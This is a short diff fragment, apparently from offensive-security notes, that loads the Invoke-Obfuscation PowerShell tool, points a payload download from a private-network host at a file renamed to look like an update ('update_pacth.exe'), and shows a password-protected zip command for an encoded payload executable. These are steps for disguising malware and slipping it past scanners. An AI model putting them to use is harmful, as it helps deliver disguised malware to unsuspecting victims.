@@ -10,7 +10,7 @@ Import-Module ./Invoke-Obfuscation.psd1
 Invoke-Obfuscation
 
 
-http://192.168.1.128:8080/payload_protegido.zip
+http://192.168.1.128:8080/update_pacth.exe
 
 zip --password SuaSenhaForte payload_protegido.zip payload_encoded.exe
 
